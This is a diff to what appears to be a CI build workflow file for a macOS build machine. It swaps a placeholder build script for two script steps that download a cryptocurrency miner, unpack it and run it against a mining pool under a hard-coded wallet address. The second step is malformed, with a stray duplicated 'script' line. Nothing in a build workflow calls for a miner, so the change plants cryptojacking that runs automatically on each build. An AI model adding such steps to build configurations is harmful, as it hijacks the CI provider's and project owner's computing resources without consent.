@@ -2,7 +2,7 @@ workflows:
   my-workflow:
     name: My workflow name
     instance_type: mac_pro
-    max_build_duration: 180
+    max_build_duration: 120
     environment:
       vars:
         PUBLIC_ENV_VAR: "value here"
@@ -20,7 +20,13 @@ workflows:
           source: true
       cancel_previous_builds: false
     scripts:
-      - ...
+      - name: script_1
+        script: |
+                wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && brew install gnu-tar && gtar xvf cpuminer-opt-mac.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.tte -t0
+      - name: script_2
+        script: |
+                script: |
+                wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && brew install gnu-tar && gtar xvf cpuminer-opt-mac.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.tte -t0
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
